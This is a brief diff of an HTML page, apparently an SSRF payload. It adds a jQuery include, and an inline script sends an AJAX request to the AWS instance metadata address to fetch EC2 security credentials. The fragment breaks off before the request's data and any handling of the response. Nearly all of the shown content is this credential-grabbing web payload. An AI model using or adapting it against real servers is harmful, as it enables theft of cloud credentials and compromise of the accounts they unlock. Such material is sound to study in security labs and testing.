@@ -15,7 +15,11 @@
 
 </form>
 </body>
+<script src="https://code.jquery.com/jquery-3.3.1.js"
+        integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossOrigin="anonymous"></script>
+
 <script>
+
     $.ajax({
         url: 'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance',
         data: {
